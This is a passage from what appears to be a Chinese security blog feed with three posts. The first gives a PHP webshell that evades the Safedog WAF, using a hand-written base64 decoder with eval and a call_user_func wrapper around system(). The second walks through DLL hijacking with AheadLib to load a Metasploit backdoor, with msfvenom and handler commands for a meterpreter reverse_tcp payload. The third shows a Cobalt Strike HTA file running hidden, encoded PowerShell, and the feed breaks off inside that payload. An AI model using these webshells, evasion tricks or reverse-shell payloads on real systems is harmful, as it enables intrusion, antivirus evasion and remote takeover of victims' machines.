class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Glacier</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br><span class="hljs-variable">$keyStr</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$input</span> = preg_replace(<span class="hljs-string">&quot;[^A-Za-z0-9\+\/\=]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-variable">$enc1</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc2</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc3</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc4</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$chr1</span> = (<span class="hljs-variable">$enc1</span> &lt;&lt; <span class="hljs-number">2</span>) | (<span class="hljs-variable">$enc2</span> &gt;&gt; <span class="hljs-number">4</span>);<br><span class="hljs-variable">$chr2</span> = ((<span class="hljs-variable">$enc2</span> &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span>) | (<span class="hljs-variable">$enc3</span> &gt;&gt; <span class="hljs-number">2</span>);<br><span class="hljs-variable">$chr3</span> = ((<span class="hljs-variable">$enc3</span> &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>) | <span class="hljs-variable">$enc4</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr1</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc3</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr2</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc4</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr3</span>);<br>&#125;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$input</span>));<br><span class="hljs-keyword">return</span> urldecode(<span class="hljs-variable">$output</span>);<br>&#125;<br><br><span class="hljs-variable">$b</span> = Glacier(<span class="hljs-string">&quot;c3lzdGVtKCdjYWxjJyk7&quot;</span>); <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] &gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>])&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å‡½æ•°æ˜¯ç”¨çš„ç½‘ä¸Šåˆ«äººæ‰‹å†™çš„base64ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥ç”¨phpåº“ä¸­çš„å…¶ä»–ç¼–ç å½¢å¼æ¥ç»•è¿‡æ²³é©¬ã€‚</p><h4 id="æµ‹è¯•å…æ€safedog"><a href="#æµ‹è¯•å…æ€safedog" class="headerlink" title="æµ‹è¯•å…æ€safedog"></a>æµ‹è¯•å…æ€safedog</h4><p>ä½¿ç”¨ç»•è¿‡æ²³é©¬çš„expä¼šè¢«safedogæ‹¦æˆªï¼Œæµ‹è¯•å‘ç°å…¶æ˜¯é€»è¾‘è¿‡æ»¤äº†evalçš„å‚æ•°ï¼Œé‚£æˆ‘ä»¬æ¢ä¸ªphpçš„åŸç”Ÿå‡½æ•°è¯•ä¸€è¯•</p><p>è¿™é‡Œçš„åˆ†æè¿‡ç¨‹ä¸ä¸Šé¢ç±»ä¼¼ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†phpçš„åŸç”Ÿå‡½æ•°<code>call_user_fnuc(&quot;aa&quot;,$_GET[&quot;a&quot;])</code><br>è¿™é‡Œç›´æ¥è´´ä¸Šexp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aa</span> (<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span>&#123;<br>    system(<span class="hljs-variable">$cc</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(call_user_func(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png" alt="æˆåŠŸç»•è¿‡å®‰å…¨ç‹—"><br><img src="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png" alt="å‘½ä»¤æ‰§è¡ŒæˆåŠŸ"></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dllåŠ«æŒä¸AheadLib</title>
      <link href="2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/"/>
      <url>2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/</url>
      
        <content type="html"><![CDATA[<h1 id="dllåŠ«æŒä¸AheadLib"><a href="#dllåŠ«æŒä¸AheadLib" class="headerlink" title="dllåŠ«æŒä¸AheadLib"></a>dllåŠ«æŒä¸AheadLib</h1><p>æœ€è¿‘åœ¨çœ‹msfé…ç½®ä¿¡æ¯çš„æ—¶å€™ï¼Œçœ‹åˆ°ç”Ÿæˆdllæ–‡ä»¶ï¼Œçªç„¶å°±æƒ³åˆ°äº†dllåŠ«æŒï¼Œäºæ˜¯å‡†å¤‡æ¥æŠ˜è…¾ä¸€ä¸‹</p><a id="more"></a><h2 id="dllåŠ«æŒ"><a href="#dllåŠ«æŒ" class="headerlink" title="dllåŠ«æŒ"></a>dllåŠ«æŒ</h2><p>dllæ–‡ä»¶æ˜¯è®¡ç®—æœºä¸Šçš„ä¸€ç±»æ–‡ä»¶ï¼Œæä¾›ç»™ä½¿ç”¨è€…ä¸€äº›å¼€ç®±å³ç”¨çš„å˜é‡ã€å‡½æ•°æˆ–ç±»ã€‚åº“æ–‡ä»¶åˆ†ä¸ºé™æ€åº“å’ŒåŠ¨æ€åº“ï¼Œé™æ€åº“å’ŒåŠ¨æ€åº“çš„åŒºåˆ«ä½“ç°åœ¨ç¨‹åºçš„é“¾æ¥é˜¶æ®µï¼šé™æ€åº“åœ¨ç¨‹åºçš„é“¾æ¥é˜¶æ®µè¢«å¤åˆ¶åˆ°äº†ç¨‹åºä¸­ï¼›åŠ¨æ€åº“åœ¨é“¾æ¥é˜¶æ®µæ²¡æœ‰è¢«å¤åˆ¶åˆ°ç¨‹åºä¸­ï¼Œè€Œæ˜¯ç¨‹åºåœ¨è¿è¡Œæ—¶ç”±ç³»ç»ŸåŠ¨æ€åŠ è½½åˆ°å†…å­˜ä¸­ä¾›ç¨‹åºè°ƒç”¨ã€‚ä½¿ç”¨åŠ¨æ€åº“ç³»ç»Ÿåªéœ€è½½å…¥ä¸€æ¬¡ï¼Œä¸åŒçš„ç¨‹åºå¯ä»¥å¾—åˆ°å†…å­˜ä¸­ç›¸åŒçš„åŠ¨æ€åº“çš„å‰¯æœ¬ï¼Œå› æ­¤èŠ‚çœäº†å¾ˆå¤šå†…å­˜ï¼Œè€Œä¸”ä½¿ç”¨åŠ¨æ€åº“ä¹Ÿä¾¿äºæ¨¡å—åŒ–æ›´æ–°ç¨‹åº</p><p>dllåŠ«æŒæ˜¯å½“ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶ï¼ŒWindowsåŠ è½½å™¨å°†å¯æ‰§è¡Œæ¨¡å—æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼ŒåŠ è½½å™¨åˆ†æå¯æ‰§è¡Œæ¨¡å—çš„è¾“å…¥è¡¨ï¼Œå¹¶è®¾æ³•æ‰¾å‡ºä»»ä½•éœ€è¦çš„DLLï¼Œå¹¶å°†å®ƒä»¬æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´</p><blockquote><p>ç®€å•æ¥è¯´ï¼Œdllçš„å­˜åœ¨å°±æ˜¯æ–¹ä¾¿ç¨‹åºæ¥ç›´æ¥è°ƒç”¨ï¼Œé¿å…å°†ç›¸åŒçš„å†…å®¹é‡å¤å¤šéï¼Œä»¥æ­¤æ¥èŠ‚çœå†…å­˜<br>è€ŒdllåŠ«æŒï¼Œç”±ä¸‹é¢ä¸€ä¸ªä¾‹å­è¯´æ˜</p></blockquote><p>ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶ï¼Œéœ€è¦è°ƒç”¨<code>test.dll</code>æ–‡ä»¶ï¼Œä½†æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„<code>test.dll</code>æ–‡ä»¶ï¼Œå¹¶è®©ä»–è°ƒç”¨æˆ‘ä»¬ç”±msfç”Ÿæˆçš„<code>shell.dll</code>æˆ–è€…å…¶ä»–åé—¨ï¼Œå†è°ƒç”¨åŸæ¥çš„<code>test.dll</code>æ–‡ä»¶</p><p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="å›¾è§£dllåŠ«æŒ"></p><p>å¦‚æœdllåŠ«æŒæˆåŠŸäº†ï¼Œé‚£åŸæœ¬çš„å¯æ‰§è¡Œæ–‡ä»¶ä»å°†æ­£å¸¸ä½¿ç”¨ï¼Œä½†æˆ‘ä»¬çš„åé—¨ä¹Ÿå°†æˆåŠŸæ‰§è¡Œï¼Œå³msfä¸Šçº¿</p><h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>è¿™é‡Œæ¨èä¸€ä¸ªç”¨æ¥ç”Ÿæˆdllè½¬å‘çš„å·¥å…·<a href="https://github.com/Yonsm/AheadLib">AheadLib</a></p><p>æˆ‘ä»¬éšä¾¿æ‰¾ä¸€ä¸ªdllæ–‡ä»¶æ¥æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p><p>æˆ‘ä»¬æŠŠå®ƒç”Ÿæˆçš„ä»£ç å¤åˆ¶ä¸‹æ¥ï¼Œç”¨VisualStudioåˆ›å»ºä¸€ä¸ªdllåŠ¨æ€é“¾æ¥é¡¹ç›®ï¼Œä½†åœ¨è¿™é‡Œï¼Œå¯èƒ½ä¼šå‡ºç°æ¯”è¾ƒå¤šçš„é—®é¢˜<br>æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ViusalStudio 2019 ä¸åŒçš„ç‰ˆæœ¬å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜ä¸åŒ</p><p>é¦–å…ˆé¡¹ç›®æç¤ºæˆ‘æ²¡æœ‰å¼•å…¥å¤´æ–‡ä»¶ï¼Œäºæ˜¯æˆ‘åŠ ä¸Šäº†<code>#include &quot;pch.h&quot;</code><br>ç´§æ¥ç€å‡ºç°äº†å¦‚ä¸‹çš„æŠ¥é”™</p><p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p><p>è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨<code>é¡¹ç›®-&gt;å±æ€§-&gt;é«˜çº§-&gt;å­—ç¬¦é›†</code> æ”¹ä¸ºä½¿ç”¨å¤šå­—èŠ‚å­—ç¬¦é›†</p><p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p><p>å…¶ä»–ç‰ˆæœ¬çš„å¯èƒ½å­˜åœ¨ä¸åŒçš„æŠ¥é”™ï¼Œå¯ä»¥å°è¯•å¦‚ä¸‹æ–¹æ³•</p><ol><li>å°†è¿è¡Œåº“æ”¹ä¸ºå¤šçº¿ç¨‹(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li><li>å°†é¢„ç¼–è¯‘å¤´æ”¹ä¸ºä¸ä½¿ç”¨<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li></ol><p>ç¡®è®¤åº”ç”¨ä¹‹åå°±åªä¼šæœ‰ä¸€ä¸ªæŠ¥é”™ï¼Œæˆ‘ä»¬ä¸ç”¨ç®¡å®ƒï¼Œåœ¨Release x86çš„æ¨¡å¼ä¸‹ï¼ŒæˆåŠŸç”Ÿæˆdllæ–‡ä»¶<br>æˆåŠŸå¤„ç†å¥½æŠ¥é”™ä¿¡æ¯åï¼Œæˆ‘ä»¬å®ç°äº†ç”±<code>test(evil).dll -&gt; test(org).dll</code><br>æ¥ä¸‹æ¥å®ç°<code>test(evil).dll-&gt;shell.dll</code><br>æˆ‘ä»¬åœ¨AheadLibå·¥å…·ç”Ÿæˆçš„cppæ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ°<code>DLLMain</code>å‡½æ•°ï¼Œå¹¶åŠ ä¸Šæˆ‘ä»¬éœ€è¦è°ƒç”¨çš„åé—¨<code>shell.dll</code></p><p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p><p>æˆåŠŸç¼–è¯‘åï¼Œå°†ç”Ÿæˆçš„dllæ–‡ä»¶æ”¹ä¸ºä¸åŸdllç›¸åŒçš„åå­—ï¼Œå³<code>test.dll</code>ï¼Œå°†åŸæœ¬çš„test.dllæ”¹ä¸º<code>testorg.dll</code><br>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†dllåŠ«æŒï¼Œå½“è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå°†ä¼šå…ˆè°ƒç”¨æˆ‘ä»¬æ”¹å†™çš„<code>test.dll</code></p><p>æœ€åï¼ŒmsfæˆåŠŸä¸Šçº¿</p><p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p><hr><h2 id="å†™åœ¨åé¢"><a href="#å†™åœ¨åé¢" class="headerlink" title="å†™åœ¨åé¢"></a>å†™åœ¨åé¢</h2><p>æœ€è¿‘æµ…æµ…çš„çœ‹äº†ä¸‹shæ–‡ä»¶çš„å†™æ³•ï¼Œäºæ˜¯å°±æƒ³åˆ°äº†å†™ä¸€äº›msfçš„shæ–‡ä»¶ï¼Œé¿å…äº†æ¯æ¬¡ä½¿ç”¨msfconsoleçš„å¤æ‚é…ç½®ä¸msfvenumç”Ÿæˆçš„å¤æ‚å‚æ•°</p><blockquote><p>msfvenumçš„ç”Ÿæˆ</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">ip=192.168.31.208<br>port=4444<br>arch=x86<br>platform=windows<br>format=exe<br>payload=windows/meterpreter/reverse_tcp<br><span class="hljs-comment">#use exploit/muilt/handler</span><br>out=../meter_re_tcp_x86.exe<br><br>msfvenom -p <span class="hljs-variable">$payload</span> LHOST=<span class="hljs-variable">$ip</span> LPORT=<span class="hljs-variable">$port</span> -f <span class="hljs-variable">$format</span> -a <span class="hljs-variable">$arch</span> --platform <span class="hljs-variable">$platform</span> -o <span class="hljs-variable">$out</span><br></code></pre></td></tr></table></figure><blockquote><p>msfconsoleçš„ç›‘å¬</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.31.208<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dllåŠ«æŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSç”Ÿæˆhtaåˆ†æä¸powershellå…æ€</title>
      <link href="2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/"/>
      <url>2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSç”Ÿæˆhtaåˆ†æä¸powershellå…æ€"><a href="#CSç”Ÿæˆhtaåˆ†æä¸powershellå…æ€" class="headerlink" title="CSç”Ÿæˆhtaåˆ†æä¸powershellå…æ€"></a>CSç”Ÿæˆhtaåˆ†æä¸powershellå…æ€</h1><p>çœ‹ç€è‡ªå·±åˆšå¼€å§‹å…¥é—¨å†™çš„wpï¼Œæ‰å‘ç°è‡ªå·±ä»æ¥æ²¡æ­£å„¿å…«ç»å†™è¿‡å•¥åšå®¢ï¼Œæœ€è¿‘é‡åˆ°äº†ä¸€ç¾¤æœ‹å‹åŠå…¶åšå®¢ï¼Œäºæ˜¯å‡†å¤‡è®°å½•ä¸€ç‚¹æœ‰è´¨é‡çš„å†…å®¹</p><a id="more"></a><h2 id="htaæ–‡ä»¶åˆ†æ"><a href="#htaæ–‡ä»¶åˆ†æ" class="headerlink" title="htaæ–‡ä»¶åˆ†æ"></a>htaæ–‡ä»¶åˆ†æ</h2><p>htaæ–‡ä»¶æ˜¯CSé’“é±¼ç»å¸¸ä¼šç”¨åˆ°çš„ä¸€ç§æ”»å‡»æ‰‹æ³•ï¼Œä½†æˆ‘ä»æœªè€ƒè™‘è¿‡é‡Œé¢çš„å†…å®¹ï¼Œä»Šå¤©çªå‘å¥‡æƒ³ï¼Œæƒ³æ¥çœ‹çœ‹é‡Œé¢åˆ°åº•å†™äº†äº›ä»€ä¹ˆä¸œè¥¿ï¼Œå¹¶ä¸”æ€æ¯’è½¯ä»¶æ˜¯å¯¹äºå“ªä¸€éƒ¨åˆ†è¿›è¡Œäº†æ‰«æå¹¶ä¸”æŠ¥æ¯’</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs VBScript">&lt;script language=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;<br><span class="hljs-keyword">Function</span> var_func()<br><span class="hljs-keyword">Dim</span> var_shell<br><span class="hljs-keyword">Set</span> var_shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>var_shell.run <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAGEAdwBpAFgAWQBNAGgAagBWAHAASABHAGcAQQAwAEcANwBBAEQAbQB6AFUAVgBSAHUANwBzAHgASgBuADUAaAB0AHoASABtAHoAdgB6ADMATABSAHYASQB6AGUAdwBrAHUAeQBQAHQATABwAEoARgB1ADcAdQBxAHUAdQByAFUANgBlAHEAeQBUAHQAbQBOAHoAZwBJAEwATQA5AFUAagBsAEwAdQBaADAAQwBDADAAUABKAGUAcgA1AEgATABYAFQAVQA5AGgAMwBCAFAAMwBMAFoAOQBiAFIAeQA1AG0ANgBYAFEANgBlAEQARQBwAGUALwBFAEQARAA3ADgAZwBRAGcASQBhAGgAdAB4AGYAdQBhAHMAKwBDAHAARABEAEYAYQA3ADMASwBIAGgAeABQAEIATABaAHQATQBoAGwATAA2AGsAZwBKAFYARgBBACsAYQB1AHIAMwBGAFUAMgBGAGIAawBoAFcAdABNAFgARgB6AEYAcgBUADEAOABjAHkAagBZAGUAQwBXAEcAagB3AGwATAAwAC8AYQBiAG4ASQBNAHQAZABmAGYAMwBhAGkASQBLAEEAdQB1AHoAMABYAG0AcABSAEoAbwBZAGgAZABRAHoAYgBvAG0ARwBCADUANwA1AHoAMAB3ADAATgA2AE0AMgB6AHMAYQBXAFkAYwBYADkAeAAxAHkAKwBsAGwAdQAwAFoAeQBEADYATABKAFEAMgBFAE4AeABDAFEANgBKAEoAMAByAGUAZABoAGwARQBaAFEAMABuADMAYgBZAG8AWAA4AG4AMwAvAG0AKwBlAFgATgA3AGEAbwBrADcAUwBKAGsAaAA0AFcAOABuAG8AUwBNAE8AaQBWAGkAMgAzAG0AZQArADgARwBuAEcANAA0AFMAbgB4AGIAeQBxAG8AVQBEAEwALwBUAFcAcgBEAFMAMQBYAEsARgBTAEcAbQBmAGUAYQA1AG4AegA2AHMAbgAzAFAASAArAE8AegBQAFEAUgB4AFAARgA1AGsASwBuAFYAawAwADQAaABEADgATQArAFkAQwBPAGUATQBNAHcAWAB1AFcAVwA2ADMAMwBLADEANAByADYAOQBlAFQATwBNAFgARwBZADUAdABLAFMANABqAEEAYQBlAHIAOQBOAGcAYgAyAEUAYQBsAHQAcgBJAEoAVABZAGQAMABqAFcAbwA1AFUATgBJAG4AMgB2AG0AZQBYAEEAaQBvAEMAdwBLAFgATwA3AGkAQwArAGoAdAB2AFYAZABhAHUASABZAGoAMgB5ADYAQwAzAGUAWAB2ADIAbAAwAFYATgBCAHAAZgB3AFAAMQBkAHAAYwBKADcASgBaAEQAcQBzADQAQQB2AG4AagBuAHgATwAzAEMAbwBHAFcAOQBPADUAaQBDAGMAWAA3AHgALwBSAHkANABlAGYAcgA4AFEAagBNAC8AOQB5AEgAMQBBAFYAVQBKAHQAYQBpAEoARwBYAHgAagBnACsANAA2AHIAdQBhAHUAcgBaAFQAYQBrAEUARQArAGgANwA0AFYAVwBwAHYAZgBFAGwAWQB1AGMAQwBrADQAZwA1AGcAVgBKAG0AcwA1AFIARQBGAEYAKwA5AFgAZAArAFQAdAB0AGUATgBNAFAAaQBwADQAWgB1AEwAMQBwAG4AbgBWAE4ANgBUAG4ANAA4AGMAYwB1AEoAWgA1AEYAVgA3AG8AcgBQAG4AZABtAFQAegByADgAWQBrAFcAVQBUAEcAcQBUAHIAbgA1ACsARwBKAGwAMQBiAEwAbQAwAG0ATABuAEkAcwBmAEMARgA4ADQAYQBPAGMAMABiAFYATgBNAHoAeABLAEYAegBFAE4ALwBDAHoAawB6AHcAdQBVAE4ATQAvAG8ANQBGAE4AQQBsADcAKwBxAFMAWQA3AEYAMwBuAFQAcgBKACsAZABFAEQASABrAFAAdwBTAHUAZwBCAFAAKwB6AE0ANgBjAGMARgB2AEsASwBxADEASQBIADgARAB1ADkAQQAwADIAdgAxADMARABNADYARQBYADYAZgBMAFMAUwB5ACsANwBwAGUAOAByAGwAaABvADMAQwBzAE0AagAxAEkAegBqAG4AdQBNAGoAcABGAE4AbQBVAEYARABuAFIARABhADMAegBrAGgAZwB4AEwAeAB2AG0ALwAzAFoAWABqAFcAeABtAFkAUgBTAHkAaQA3AGsAVgAvAHcARwBrADUANgAwAGIAbgBnAHMAbgBKAHMASwBRAFgAWQBCAGgAcABQAHMAVQBXADgAaABPAFUAUwBsAHkAYgBZAHYAUQBlAHEASgBiADUAcwBXAEYALwBJAGUAWQBOAEoAQgB0AHcANQBFAEQAUwAzAHYASQBDAGMAeQBrAFcATwBnAHMANQBVAHgAQQBpAHYALwBLAEQANwA2AGsAVQA2AFkANAB2AGsAMABkAGsATQA2AHEAawBHAHcAagBFADIAcgBPACsAVQBSAGwAZABFAE0AbQBKAGYAbAAvADQALwBiAGwAbgBKAHcATwBSAFkAcgBWAEIAYQBSADMAVABnAE0AQgBkAE4AdABqAFIAVwA1AGkAQgBRAHoAcQBXAHIANwA0AEMALwBIACsATwAvAGQAKwBMAGoARQAvAHUAZABrAEkANgBEAG0AUgBoAGUAdwBnAEwAdQBzAEoAUwA0ADkATABKAG8AbgBUAHkAKwBYAHAARABjAHMATQB1AFkAQQBCAGEAbgBMAGcATwBYAFUAVQAwAHIAdQBxAG4AcABXAHgAUQBsADUANABpAEgAWgBLAG8AbQA0AEgAZAAwAEYATAAyAHMAdgB0AFgAVgBzAGEAdwBiAE8ASABSADkAagBKAFUAcQAvAFgARwBmAHIAMQBZAFEAOQBMADAAWABPAC8AWABlADYAcwBsAGMARgBEAHMAeAByAEYAawBSAEsATgA2AG0AVgBCAEwAbwBQAGMAYwBkAGUAUwAxAHMAcgArADIAWgB2AGYAUgBrADcAMQBsAHYAagBLAFgAbwBPADUAOABIADcAWABEAHAAdgBLAHYAaQBtADIASwB6AHQAUAB2AGoATwB0AHgANwBPAGQAawAvADcAQQBpAEcAKwBOAG0AUwBMAGYARwB5ADIANQAyAHAANgBFAGMAaQByAGYAVgB2AFoAMQBlAGQAZAA0ADkARwBEADgAaAA3AEoAdgBlAEIAMwBRAGUANwBqAHoAMwBYAHAATQBxAGwAVABxADMATgBGAFoARAA4AGMAQwBlADYARABJAFAAQwBUAGQAeQBSAGUAOQBmAE4AdQBhAEoARgBwAHYASQB2AG0AYQA3AHAASwBlAGMAVAB1AFEATwA5AHEAeABJAHIARgBEAG0AYgBTAEgAWgBTAEsARgBDAHoATABaAFMAVQBMAGYANgBQAG8AUQBwAHkASwBZACsAcAAzAGIAUwBYAFMAOQBuAHUAQgBYAE4AdABwAGEANgBoAGEAMwB0AFIANwBwADcAaAA1AHEANQBGAGgASgBaAEsAMABLAE8AQgB6ADAAUgBOADMATQA3ADgAZwBCAHoAKwBRAFkAegA3AFIAZQAwAHAANQByAEwAYgBDADcAaQA2AFoAbQB0AGEAMwBxAEEAdABqAFcAeQBTAEUAbQA0AC8AQwA1AE0AMgBKAHoAbwBZACsAYwBhAHAASwA0ADEAWQBhAHkAVgBRADQAOQA3AEwAUABKAHIASABNAFgAbwBLAFQAaAA5AHkAeABxADEATgBjAHMAMQBlADMAMABGAG0AYgBuAFUAVwBJAG4ALwAzAFIAOQBtAEIAQwB3AGIAYgBkAEgAegBTADcAWQBkAGgAdQBxAEMAcgBsAEEATgBaAG0ATwBRAGEAWQBiAFcAbQBEAHIASQBkAGcAcAA0AEcATgB5AHQAOABXAEMARgBxAHYARwBzAEsATwBOAEcAdQByAFUARQBEAHYASAB1AHEATgBaAFcARABCAG4AYQAwAEcAcgAwAGMATgA4ADEAaABDADAAeAA4AFoAbQBhAE0ANQBGAGIAegB3AHoAaQBZAE8AYwB1AG8AVQBIAHQAWgBoAFUATwBtAHgAUgA2AFIAdwBXAGMAYwAwAHkAWgBtAFIASABwAHYANgBCAHUA